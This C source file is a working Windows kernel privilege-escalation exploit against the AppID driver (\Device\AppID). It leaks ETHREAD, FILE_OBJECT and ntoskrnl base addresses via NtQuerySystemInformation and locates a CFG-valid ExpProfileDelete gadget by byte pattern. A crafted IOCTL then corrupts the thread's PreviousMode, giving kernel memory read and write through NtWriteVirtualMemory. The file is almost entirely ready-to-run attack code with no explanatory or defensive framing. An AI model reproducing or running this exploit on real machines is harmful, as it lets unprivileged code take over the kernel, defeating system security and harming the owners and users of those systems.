#include "Common.h"

void* CheckWindowsVersionAndSetOffsets(size_t* kthreadoffset, OSVERSIONINFOEXW* osInfo) 
{
    osInfo->dwOSVersionInfoSize = sizeof(*osInfo);

    NTSTATUS status = RtlGetVersion(osInfo);
    if (status != STATUS_SUCCESS) {
        wprintf(L"Failed to get OS version\n");
        return NULL;
    }

    wprintf(L"[+] Windows version: %lu.%lu Build %lu\n", osInfo->dwMajorVersion, osInfo->dwMinorVersion, osInfo->dwBuildNumber);

    *kthreadoffset = 0x232; // PreviousMode offset
    void* userbuffer = NULL;

    if (osInfo->dwBuildNumber < 22000) {
        userbuffer = malloc(sizeof(USER_BUFFER_W10));
    }
    else {
        userbuffer = malloc(sizeof(USER_BUFFER_W11));
    }

    return userbuffer;
}

UINT_PTR GetETHREADAddress()
{
    NTSTATUS status;
    HANDLE hCurrentThreadPseudoHandle = ((HANDLE)(LONG_PTR)-2);
    HANDLE hDuplicatedHandle = NULL;
    UINT_PTR tokenAddress = 0;
    ULONG ulBytes = 0;
    PSYSTEM_HANDLE_INFORMATION handleTableInfo = NULL;

    BOOL success = DuplicateHandle(
        ((HANDLE)(LONG_PTR)-1),
        hCurrentThreadPseudoHandle,
        ((HANDLE)(LONG_PTR)-1),
        &hDuplicatedHandle,
        0,
        FALSE,
        DUPLICATE_SAME_ACCESS);

    if (!success) 
    {
        wprintf(L"Failed to duplicate handle. Error: %lu\n", GetLastError());
        return 1;
    }

    while ((status = NtQuerySystemInformation(SystemHandleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (handleTableInfo != NULL)
        {
            handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
        }

        else
        {
            handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (status == 0)
    {
        for (ULONG i = 0; i < handleTableInfo->NumberOfHandles; i++)
        {
            if (handleTableInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() && handleTableInfo->Handles[i].HandleValue == (USHORT)hDuplicatedHandle)
            {
                tokenAddress = (UINT_PTR)handleTableInfo->Handles[i].Object;
                break;
            }
        }
    }
    else
    {
        if (handleTableInfo != NULL)
        {
            wprintf(L"[!] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
            HeapFree(GetProcessHeap(), 0, handleTableInfo);
            CloseHandle(hDuplicatedHandle);
            return 0;
        }
    }

    HeapFree(GetProcessHeap(), 0, handleTableInfo);

    return tokenAddress;
}

UINT_PTR GetFILE_OBJECT_Address()
{
    NTSTATUS status;
    HANDLE hDuplicatedHandle = NULL;
    UINT_PTR tokenAddress = 0;
    ULONG ulBytes = 0;
    PSYSTEM_HANDLE_INFORMATION handleTableInfo = NULL;

    HANDLE hFile = CreateFileW(L"C:\\Users\\Public\\example.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Failed to duplicate handle. Error: %lu\n", GetLastError());
        return 1;
    }
    // Allocate space in the heap for the handle table information which will be filled by the call to 'NtQuerySystemInformation' API
    while ((status = NtQuerySystemInformation(SystemHandleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (handleTableInfo != NULL)
        {
            handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
        }

        else
        {
            handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (status == 0)
    {
        for (ULONG i = 0; i < handleTableInfo->NumberOfHandles; i++)
        {
            if (handleTableInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() && handleTableInfo->Handles[i].HandleValue == (USHORT)hFile)
            {
                tokenAddress = (UINT_PTR)handleTableInfo->Handles[i].Object;
                break;
            }
        }
    }
    else
    {
        if (handleTableInfo != NULL)
        {
            wprintf(L"[!] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
            HeapFree(GetProcessHeap(), 0, handleTableInfo);
            CloseHandle(hDuplicatedHandle);
            return 0;
        }
    }

    HeapFree(GetProcessHeap(), 0, handleTableInfo);

    return tokenAddress;
}

UINT_PTR GetKernelModuleAddress(const char* TargetModule)
{
    NTSTATUS status;
    ULONG ulBytes = 0;
    PSYSTEM_MODULE_INFORMATION handleTableInfo = NULL;

    while ((status = NtQuerySystemInformation(SystemModuleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (handleTableInfo != NULL)
        {
            handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
        }

        else
        {
            handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (status == 0)
    {
        for (ULONG i = 0; i < handleTableInfo->ModulesCount; i++)
        {
            char* moduleName = strstr(handleTableInfo->Modules[i].Name, TargetModule);
            if (moduleName != NULL)
            {
                return (UINT_PTR)handleTableInfo->Modules[i].ImageBaseAddress;
            }
        }
    }
    else
    {
        if (handleTableInfo != NULL)
        {
            wprintf(L"[!] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
            HeapFree(GetProcessHeap(), 0, handleTableInfo);
            return 0;
        }
    }

    HeapFree(GetProcessHeap(), 0, handleTableInfo);

    return 0;
}

int SendRequest(HANDLE hDevice, PVOID inputbuffer, size_t inputbufferLen)
{
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    ULONG dwbytesreturned = 0;

    status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_AipSmartHashImageFile, inputbuffer, inputbufferLen, NULL, dwbytesreturned);

    if (status == NOERROR)
    {
        return 1;
    }
    else
    {
        wprintf(L"[!] NtDeviceIoControlFile failed with 0x%X\n", status);
        return 0;
    }
}

BOOL ScanSectionForPattern(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T dwSize, BYTE* pattern, SIZE_T patternSize, LPVOID* lpFoundAddress) {
    BYTE* buffer = (BYTE*)malloc(dwSize);
    SIZE_T bytesRead;

    if (!ReadProcessMemory(hProcess, lpBaseAddress, buffer, dwSize, &bytesRead)) {
        free(buffer);
        return FALSE;
    }

    for (SIZE_T i = 0; i < dwSize - patternSize; i++) {
        BOOL found = TRUE;
        for (SIZE_T j = 0; j < patternSize; j++) {
            if (buffer[i + j] != pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            *lpFoundAddress = (LPVOID)((DWORD_PTR)lpBaseAddress + i);
            free(buffer);
            return TRUE;
        }
    }

    free(buffer);
    return FALSE;
}

UINT_PTR FindPattern(HMODULE hModule)
{
    UINT_PTR relativeOffset = 0;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    LPVOID lpFoundAddress = NULL;

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((CHAR*)pSectionHeader[i].Name, "PAGE") == 0) {
            LPVOID lpSectionBaseAddress = (LPVOID)((LPBYTE)hModule + pSectionHeader[i].VirtualAddress);
            SIZE_T dwSectionSize = pSectionHeader[i].Misc.VirtualSize;

            // Pattern of bytes for nt!ExpProfileDelete
            // Learned hard way that CFG is such sensitive to even missing a single byte
            BYTE pattern[] = {0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0x79, 0x30, 0x00, 0x48, 0x8B, 0xD9, 0x74};
            SIZE_T patternSize = sizeof(pattern);

            if (ScanSectionForPattern(GetCurrentProcess(), lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)) {
                printf("\t[*] ExpProfileDelete function found in the PAGE section of ntoskrnl.exe.\n");
                printf("\t[*] Starting address of ExpProfileDelete: 0x%p\n", lpFoundAddress);

                // Calculate the relative offset
                relativeOffset = (UINT_PTR)lpFoundAddress - (UINT_PTR)hModule;
                printf("\t[*] Relative offset of ExpProfileDelete: 0x%p\n", (LPVOID)relativeOffset);
            }
            else {
                printf("\t[!] ExpProfileDelete function not found in the PAGE section of ntoskrnl.exe.\n");
            }

            break;
        }
    }

    return relativeOffset;
}

int exploit()
{
    size_t offsetOfPreviousMode = 0;
    size_t bufferLength = 0;
    OSVERSIONINFOEXW osInfo = { 0 };
    CFG_FUNCTION_WRAPPER cfgFunction = { 0 };
    void* userBuffer = CheckWindowsVersionAndSetOffsets(&offsetOfPreviousMode, &osInfo);

    if (!userBuffer) {
        wprintf(L"Failed to allocate or determine the correct user buffer.\n");
        return -1; // Error handling
    }

    ULONG_PTR PrevMode = NULL;
    NTSTATUS status;
    DWORD dwBytesReturned = 0;
    HANDLE hDevice, eventHandle = NULL;
    UNICODE_STRING deviceName;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatus;
    RtlInitUnicodeString(&deviceName, L"\\Device\\AppID");
    InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL, NULL);
    wprintf(L"[^] Trying to open a handle to %ws\n", deviceName.Buffer);
    status = NtCreateFile(&hDevice, GENERIC_READ | GENERIC_WRITE,
        &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);

    if (status != 0)
    {
        wprintf(L"[!] Failed to open a handle to %ws (NTSTATUS code: 0x%X)\n", deviceName.Buffer, status);
        return -1;
    }

    wprintf(L"[+] Opened a handle successfully %p\n", hDevice);
    wprintf(L"[*] Leaking the current ETHREAD address\n");
    UINT_PTR ETHREADAddress = GetETHREADAddress();
    UINT_PTR FILE_OBJECT_Address = GetFILE_OBJECT_Address();
    UINT_PTR ntoskrnlKernelBase = GetKernelModuleAddress("ntoskrnl.exe");
    HMODULE ntoskrnlUserBase = LoadLibraryExW(L"C:\\Windows\\System32\\ntoskrnl.exe", NULL, 0);

    if (!ETHREADAddress && !ntoskrnlKernelBase && !ntoskrnlUserBase && !FILE_OBJECT_Address)
    {
        wprintf(L"[!] Failed to leak the ETHREAD/KernelBase address\n");
        return -1;
    }

    wprintf(L"[+] Leaked ETHREAD address: 0x%p\n", ETHREADAddress);

    PrevMode = ETHREADAddress + offsetOfPreviousMode;

    UINT_PTR reloffset = FindPattern(ntoskrnlUserBase);

    UINT_PTR CFG_GADGET = ntoskrnlKernelBase + reloffset;

    wprintf(L"[+] Our Thread PreviousMode Kernel Address => %p\n", PrevMode);
    wprintf(L"[+] FILE_OBJECT Address => %p\n", FILE_OBJECT_Address);
    wprintf(L"[+] CFG Gadget Kernel Base Address => %p\n", ntoskrnlKernelBase);
    wprintf(L"[+] CFG Gadget User Base Address => %p\n", ntoskrnlUserBase);
    wprintf(L"[+] CFG Gadget Address => %p\n", CFG_GADGET);


    if (osInfo.dwBuildNumber < 22000) {
        USER_BUFFER_W10* bufferW10 = (USER_BUFFER_W10*)userBuffer;

        cfgFunction.FunctionPointer = CFG_GADGET;
        // Add 0x30 because of lock xadd qword ptr [rsi-30h], rbx in ObfDereferenceObjectWithTag
        UINT_PTR prevModeObf = PrevMode + 0x30;

        bufferW10->FirstArg = prevModeObf; // +0x00
        bufferW10->Value = FILE_OBJECT_Address; // +0x08
        bufferW10->PtrToFunctionWrapper = (UINT_PTR)&cfgFunction; // +0x10

        bufferLength = sizeof(USER_BUFFER_W10);
    }
    else 
    { 
        USER_BUFFER_W11* bufferW11 = (USER_BUFFER_W11*)userBuffer;

        cfgFunction.FunctionPointer = CFG_GADGET;
        // Add 0x30 because of lock xadd qword ptr [rsi-30h], rbx in ObfDereferenceObjectWithTag
        UINT_PTR prevModeObf = PrevMode + 0x30;

        bufferW11->FirstArg = prevModeObf; // +0x00
        bufferW11->Value = FILE_OBJECT_Address; // +0x08
        bufferW11->PtrToFunctionWrapper = (UINT_PTR)&cfgFunction; // +0x10
        bufferW11->Unknown = NULL; // +0x18

        bufferLength = sizeof(USER_BUFFER_W11);
    }

    wprintf(L"[*] Sending the request to trigger the bug\n");
    char* buffer = (char*)malloc(sizeof(CHAR));
    if (userBuffer)
    {
        if (SendRequest(hDevice, userBuffer, bufferLength))
        {
            wprintf(L"[+] Sent the request successfully\n");
        }
        else
        {
            wprintf(L"[!] Failed to send the request\n");
            return -1;
        }
        wprintf(L"[+] Request Successful!\n");
        wprintf(L"[+] Checking PreviousMode...\n");
        NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)buffer, (PVOID)PrevMode, sizeof(CHAR), &dwBytesReturned);
        wprintf(L"[*] PreviousMode => %d\n", *buffer);
    }

    wprintf(L"[+] Exploit Done!\n");
    wprintf(L"[+] Starting cleanup...\n");
    Sleep(2000);
    *buffer = 1;
    NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)PrevMode, (PVOID)buffer, sizeof(CHAR), &dwBytesReturned);
    wprintf(L"[+] Cleanup Done!.\n[+] Press Enter To End!\n");
    getchar();

    free(userBuffer);
    free(buffer);
    NtClose(hDevice);

    return 0;
}